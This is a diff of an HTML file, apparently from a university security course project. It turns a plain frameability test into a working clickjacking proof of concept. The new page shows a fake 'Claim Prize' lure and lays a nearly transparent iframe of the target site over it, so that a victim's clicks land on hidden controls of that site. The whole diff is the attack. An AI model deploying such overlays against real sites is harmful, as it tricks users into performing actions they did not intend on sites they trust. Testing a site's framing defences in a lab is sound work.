@@ -1,12 +1,43 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Clickjacking Test</title></head>
+  <head>
+    <title>Clickjacking PoC</title>
+    <style>
+      body { margin:0; padding:0; }
+      #decoy {
+        position: relative;
+        width: 100%;
+        height: 100vh;
+        background: #eef;
+        text-align: center;
+        padding-top: 50px;
+        font-size: 24px;
+      }
+      #targetFrame {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        opacity: 0.01;
+        z-index: 2;
+      }
+      #coverButton {
+        position: absolute;
+        top: 200px;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 1;
+        font-size: 20px;
+        padding: 10px 20px;
+      }
+    </style>
+  </head>
   <body>
-    <h1>Clickjacking Test Frame</h1>
-    <iframe src="https://cpeg470-project-1-cc52a.web.app/"
-            width="1000" height="600"
-            style="opacity:0.8; border: 3px solid red;">
-    </iframe>
-    <p>If you see the target site inside the red border frame, then the site is frameable.</p>
+    <div id="decoy">
+      <h1>Click here to claim your prize!</h1>
+      <button id="coverButton">Claim Prize</button>
+    </div>
+    <iframe id="targetFrame" src="https://cpeg470-project-1-cc52a.web.app/"></iframe>
   </body>
 </html>
